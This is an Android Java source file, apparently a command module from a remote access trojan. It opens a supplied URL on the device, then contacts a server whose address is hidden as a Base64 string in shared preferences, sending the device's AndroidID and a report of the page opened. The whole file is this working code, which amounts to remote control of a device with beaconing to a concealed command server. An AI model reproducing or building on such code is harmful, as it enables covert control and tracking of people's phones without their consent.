package com.asynctask;

import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Base64;

import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.UnsupportedEncodingException;

/**
 * Created by Conan0xff on 2017/12/5.
 */

public class openWebpage extends AsyncTask<String, Void, String> {
    String i = "";

    public openWebpage(String i) {
        this.i = i;
    }

    @Override
    protected String doInBackground(String... params) {
        if (!i.startsWith("http://") && !i.startsWith("https://")) i = "http://" + i;
        final Intent intent = new Intent(Intent.ACTION_VIEW).setData(Uri.parse(i));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        MyApplication.getContext().startActivity(intent);

        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Webpage Opened: " + i.replace(".", "-"));
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }

        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {
    }

    @Override
    protected void onPreExecute() {
    }

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
